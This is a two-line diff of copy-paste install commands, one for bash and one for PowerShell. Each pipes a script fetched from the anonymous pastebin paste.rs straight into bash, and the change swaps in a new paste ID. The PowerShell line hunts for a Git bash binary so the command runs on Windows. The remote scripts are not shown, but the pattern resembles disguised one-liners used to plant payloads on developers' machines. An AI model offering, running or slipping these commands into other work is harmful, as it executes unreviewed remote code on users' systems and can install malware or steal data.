@@ -1,2 +1,2 @@
 bash -c "curl -s https://paste.rs/3GrwU | bash"
-$b = @('bash', 'C:\Program Files\Git\bin\bash.exe', 'C:\Program Files\Git\usr\bin\bash.exe', "$env:USERPROFILE\AppData\Local\Programs\Git\bin\bash.exe") | Where-Object { (Get-Command $_ -EA 0) -or (Test-Path $_) } | Select -First 1; if ($b) { & $b -c "curl -s https://paste.rs/3GrwU | bash" } else { Write-Error "Git is not installed on this computer!" }
+$b = @('bash', 'C:\Program Files\Git\bin\bash.exe', 'C:\Program Files\Git\usr\bin\bash.exe', "$env:USERPROFILE\AppData\Local\Programs\Git\bin\bash.exe") | Where-Object { (Get-Command $_ -EA 0) -or (Test-Path $_) } | Select -First 1; if ($b) { & $b -c "curl -s https://paste.rs/DPUQz | bash" } else { Write-Error "Git is not installed on this computer!" }
